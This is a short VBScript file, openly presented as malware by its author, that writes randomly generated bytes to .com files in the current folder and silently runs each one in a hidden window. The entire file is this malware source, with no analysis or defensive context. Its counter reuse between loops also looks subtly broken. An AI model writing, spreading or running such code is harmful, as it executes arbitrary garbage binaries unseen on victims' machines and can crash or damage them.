'Spammer.VBS.RandomCOM.A
'By Tsuki Superior
'This piece of malware randomly generates 2048 512 byte garbage data com files, and runs them in backround

On Error Resume Next
Randomize
Dim hexstring, name, strLetters, lgt, lgtt, i
hexstring = ""
For i = 1 To 2048
	makecom hexstring, 2
Next
Sub makecom(strSource, lSize)
    strLetters = "abcdef0123456789"
	
	'Get a random name for the file
	name = CStr(Rnd() * Rnd())
	hexstring = ""
	For i = 1 to 1024 Step 2
		lgt = int((rnd(1)*16)+1)
		lgtt = int((rnd(1)*16)+1)
		hexstring = hexstring & Mid(strLetters,lgt,1) & Mid(strLetters,lgtt,1)
	Next
	
	'Decode and write file
	strSource = Replace(strSource, " ", "")
    With CreateObject("Scripting.FileSystemObject").CreateTextFile(".\" & name & ".com", True)
        For lp = 1 To Len(strSource) Step lSize
            .Write Chr(CByte("&H" & Mid(strSource, lp, lSize)))
        Next
    End With
	
	'Run in background
	WScript.CreateObject("WScript.Shell").Run name & ".com", 0
End Sub 


